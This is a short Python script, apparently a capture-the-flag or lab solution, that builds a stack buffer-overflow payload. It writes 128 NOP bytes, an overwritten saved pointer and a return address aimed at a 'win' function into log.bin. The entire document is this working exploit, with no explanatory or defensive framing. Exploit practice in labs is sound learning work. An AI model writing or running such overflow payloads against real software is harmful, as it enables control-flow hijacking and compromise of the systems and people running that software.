import sys

data = bytearray(0x90 for i in range(128))
ret = 0x7fffffffdb90
win_add = 0x401276

result = data + ret.to_bytes(8, 'little') + win_add.to_bytes(8, 'little')

with open("log.bin", "wb") as f:
    f.write(result)
